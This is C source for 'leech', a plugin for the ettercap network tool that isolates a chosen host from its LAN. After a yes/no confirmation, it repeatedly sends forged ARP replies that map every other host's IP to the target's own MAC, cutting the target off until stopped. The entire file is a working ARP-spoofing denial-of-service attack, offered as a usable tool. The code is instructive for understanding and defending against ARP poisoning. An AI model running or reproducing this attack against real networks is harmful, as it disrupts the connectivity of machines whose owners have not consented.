/*
    leech -- ettercap plugin -- Isolate an host from the lan

    Copyright (C) 2001  NaGoR

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

    $Id: leech.c,v 1.5 2002/02/10 10:07:01 alor Exp $
*/

#include <unistd.h>

#include "../../src/include/ec_main.h"                   // required for global variables
#include "../../src/include/ec_plugins.h"                // required for input/output
#include "../../src/include/ec_inet_structures.h"
#include "../../src/include/ec_inet.h"
#include "../../src/include/ec_inet_forge.h"

// protos...

int Plugin_Init(void *);
int Plugin_Fini(void *);
int leech_function(void *dummy);

// plugin operation

struct plugin_ops ops = {
   ettercap_version: VERSION,
   plug_info:        "Isolate a host from the LAN",
   plug_version:     17,
   plug_type:        PT_EXT,
   hook_point:       HOOK_NONE,
   hook_function:    &leech_function,
};

//==================================

int Plugin_Init(void *params)
{
   return Plugin_Register(params, &ops);
}

int Plugin_Fini(void *params)
{
   return 0;
}

// =================================

int leech_function(void *dummy)
{
    int IPS, IPD, sock, i;
    unsigned char MACS[6];
    unsigned char MACD[6];
    char *pck_to_send;
    char cont[10];

    if (!strcmp(Host_Dest.ip,""))
    {
      Plugin_Output("Please select a Dest...\n");
      return 0;
    }

    memset(cont, 0, 10);

    Plugin_Output("Are you sure you want to isolate %s ? (yes/no) ", Host_Dest.ip );
    Plugin_Input(cont, 5, P_BLOCK);
    if (strcmp(cont, "yes"))  // not sure... ;)
    {
      Plugin_Output("\nIt is safe!  for now...\n");
      return 0;
    }
    Plugin_Output("\nBuilding host list for netmask %s, please wait...\n", Inet_MySubnet());
         number_of_hosts_in_lan = Inet_HostInLAN();

    for (i=0; i<number_of_hosts_in_lan; i++)
        if (!strcmp(Host_Dest.ip, Host_In_LAN[i].ip))
       Inet_GetMACfromString(Host_In_LAN[i].mac, MACD);

    IPD = inet_addr(Host_Dest.ip);

    sock = Inet_OpenRawSock(Options.netiface);
    Inet_GetIfaceInfo(Options.netiface, 0, MACS, 0, 0);

    pck_to_send = (char *)Inet_Forge_packet( ETH_HEADER + ARP_HEADER );
    Inet_Forge_ethernet( pck_to_send, MACS, MACD, ETH_P_ARP );

    Plugin_Output("\nIsolating host %s...",Host_Dest.ip);
    Plugin_Output("Press return to stop");

    loop
    {
      int j;

      for (j=0; j<number_of_hosts_in_lan; j++)
      {
         IPS=inet_addr(Host_In_LAN[j].ip);
         if (IPS!=IPD)
         {
            Inet_Forge_arp( pck_to_send+ETH_HEADER, ARPOP_REPLY, MACD, IPS, MACD, IPD);
            Inet_SendRawPacket(sock, pck_to_send, ETH_HEADER + ARP_HEADER);
         }
      }
      sleep(Options.delay);
      if (Plugin_Input(cont, 1, P_NONBLOCK))
      {
         Inet_Forge_packet_destroy( pck_to_send );
         Inet_CloseRawSock(sock);
         return 0;
      }
    }
}

/* EOF */
